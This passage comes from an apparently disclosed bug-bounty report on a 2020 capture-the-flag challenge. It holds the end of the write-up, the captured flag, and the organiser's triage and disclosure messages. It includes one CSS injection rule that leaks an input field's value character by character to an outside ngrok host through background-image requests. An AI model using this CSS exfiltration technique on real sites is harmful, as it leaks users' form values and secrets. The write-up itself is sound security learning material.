+input:nth-child(8)[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+-8"); }
+```
+
+This ended up with the following requests: 
+
+{F861122}
+
+and that way I was able to find the flag:
+
+{F861142}
+
+## Impact
+
+Flag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.
+
+Thanks again for this great and long challenge!
+- **Report Triaged**
+- **2020-06-11** @nahamsec: Hello,
+
+I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!
+
+We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!
+
+If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!
+- **Report Resolved**
+- **2020-06-19** @shakedko: Any chance to disclose & make public? 
+
+Thank you!
+- **Agreed On Going Public**
+- **Manually Disclosed**
